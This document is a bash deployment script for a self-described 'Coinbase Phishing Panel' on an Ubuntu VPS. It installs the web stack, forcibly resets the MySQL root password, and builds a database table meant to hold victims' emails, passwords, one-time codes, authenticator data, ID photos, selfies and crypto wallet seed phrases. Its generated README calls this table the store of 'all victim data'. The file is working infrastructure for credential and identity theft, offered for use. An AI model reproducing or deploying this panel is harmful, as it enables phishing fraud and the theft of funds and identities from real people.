#!/bin/bash

# Coinbase Phishing Panel Setup Script for Ubuntu 20.04/22.04
# This script installs all necessary dependencies and initializes the database

set -e

echo "=============================================="
echo "Coinbase Phishing Panel Setup Script"
echo "=============================================="
echo ""

# Running as root - no user check needed for VPS setup

# Update system packages
echo "Updating system packages..."
apt update && apt upgrade -y

# Install Apache web server
echo "Installing Apache web server..."
sudo apt install -y apache2

# Install PHP and required extensions
echo "Installing PHP and required extensions..."
apt install -y php php-mysql php-curl php-json php-mbstring php-xml php-zip

# Install MySQL server
echo "Installing MySQL server..."
apt install -y mysql-server

# Start and enable services
echo "Starting and enabling services..."
systemctl start apache2
systemctl enable apache2
systemctl start mysql
systemctl enable mysql

# Configure MySQL
echo "Configuring MySQL..."
echo "Attempting to reset MySQL root password..."

# Stop MySQL service for password reset
systemctl stop mysql

# Start MySQL in safe mode without authentication
sudo mkdir -p /var/run/mysqld
sudo chown mysql:mysql /var/run/mysqld
sudo mysqld_safe --skip-grant-tables --skip-networking &
sleep 5

# Reset root password and create users
mysql -u root <<EOF
FLUSH PRIVILEGES;
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
CREATE USER IF NOT EXISTS 'coinbase_user'@'localhost' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'coinbase_user'@'localhost' WITH GRANT OPTION;
GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF

# Kill the safe mode MySQL and restart normally
sudo pkill -9 mysqld
sleep 3
systemctl start mysql

echo "MySQL root password has been set to: password"

# Create database and table
echo "Creating database and table..."
mysql -u coinbase_user -ppassword -e "
CREATE DATABASE IF NOT EXISTS coinbase_panel;
USE coinbase_panel;

CREATE TABLE IF NOT EXISTS user_submissions (
    id INT AUTO_INCREMENT PRIMARY KEY,
    token VARCHAR(255) UNIQUE,
    activity VARCHAR(255),
    email VARCHAR(255),
    data TEXT,
    status VARCHAR(255),
    password VARCHAR(255),
    phone_otp VARCHAR(255),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    ip_address VARCHAR(45),
    user_agent TEXT,
    auth_app TEXT,
    login_url VARCHAR(255),
    email_otp VARCHAR(255),
    email_app VARCHAR(255),
    front TEXT,
    back TEXT,
    selfie TEXT,
    seed TEXT,
    vault_crypto TEXT,
    vault_code VARCHAR(255)
);
"

# Create admin user
echo "Creating admin user..."
mysql -u coinbase_user -ppassword -e "
USE coinbase_panel;
INSERT IGNORE INTO user_submissions (email, token, activity) VALUES ('admin@panel.local', 'admin_token', 'admin');
"

# Set proper permissions
echo "Setting proper permissions..."
chown -R www-data:www-data /var/www/html
chmod -R 755 /var/www/html

# Create symbolic link for web access
echo "Setting up web directory..."
rm -rf /var/www/html/*
cp -r . /var/www/html/
chown -R www-data:www-data /var/www/html

# Configure Apache for PHP
echo "Configuring Apache..."
a2enmod php*
systemctl restart apache2

# Create .htaccess for security
echo "Creating security configurations..."
tee /var/www/html/.htaccess > /dev/null <<EOF
# Protect sensitive files
<Files ~ "^\.">
    Require all denied
</Files>

<Files "db_connection.php">
    Require all denied
</Files>

<Files "setup.sh">
    Require all denied
</Files>

# Prevent directory listing
Options -Indexes

# Enable PHP
AddType application/x-httpd-php .php
EOF

# Create a config file
echo "Creating configuration file..."
tee /var/www/html/config.php > /dev/null <<EOF
<?php
// Database configuration
define('DB_HOST', 'localhost');
define('DB_USER', 'coinbase_user');
define('DB_PASS', 'password');
define('DB_NAME', 'coinbase_panel');

// Application settings
define('SITE_URL', 'http://localhost');
define('ADMIN_EMAIL', 'admin@panel.local');
?>
EOF

# Create installation log
echo "Creating installation log..."
tee /var/www/html/install.log > /dev/null <<EOF
Installation completed on: $(date)
PHP Version: $(php -v | head -n 1)
MySQL Version: $(mysql --version)
Apache Version: $(apache2 -v | head -n 1)

Access URLs:
- Main Panel: http://localhost
- Admin Panel: http://localhost/admin
- Admin Login: admin@panel.local / 123

Database Info:
- Host: localhost
- Database: coinbase_panel
- User: coinbase_user
- Password: password
EOF

# Create run script for development
echo "Creating development run script..."
tee run_dev.sh > /dev/null <<EOF
#!/bin/bash
echo "Starting PHP Development Server..."
echo "Access URLs:"
echo "- Main Panel: http://localhost:8000"
echo "- Admin Panel: http://localhost:8000/admin"
echo "- Admin Login: admin@panel.local / 123"
echo ""
php -S localhost:8000
EOF

chmod +x run_dev.sh

# Create README for setup
echo "Creating README..."
tee README.md > /dev/null <<EOF
# Coinbase Phishing Panel

## Quick Setup

### Method 1: Automated Setup (Recommended)
\`\`\`bash
./setup.sh
\`\`\`

### Method 2: Manual Setup

1. **Install Dependencies:**
   \`\`\`bash
   sudo apt update
   sudo apt install -y apache2 php php-mysql php-curl mysql-server
   \`\`\`

2. **Setup Database:**
   \`\`\`bash
   sudo mysql
   CREATE DATABASE coinbase_panel;
   CREATE USER 'coinbase_user'@'localhost' IDENTIFIED BY 'password';
   GRANT ALL PRIVILEGES ON coinbase_panel.* TO 'coinbase_user'@'localhost';
   FLUSH PRIVILEGES;
   \`\`\`

3. **Run Development Server:**
   \`\`\`bash
   ./run_dev.sh
   \`\`\`

## Access Points

- **Main Panel:** http://localhost:8000
- **Admin Panel:** http://localhost:8000/admin
- **Admin Login:** admin / 123

## Database Structure

The application uses MySQL with the following key tables:
- \`user_submissions\`: Stores all victim data

## Troubleshooting

- **Port 8000 in use:** Change port in run_dev.sh
- **Database connection errors:** Check MySQL service status
- **Permission errors:** Check file permissions (755 for directories, 644 for files)

## Security Notes

- Change default passwords in production
- Use HTTPS in production
- Restrict database access
- Regular security updates
EOF

# Make setup script executable
chmod +x setup.sh

echo ""
echo "=============================================="
echo "Setup Complete!"
echo "=============================================="
echo ""
echo "To start the panel:"
echo "1. ./run_dev.sh (for development server on port 8000)"
echo "2. OR access via Apache at http://localhost"
echo ""
echo "Admin Login: admin / 123"
echo ""
echo "Check install.log for detailed information."
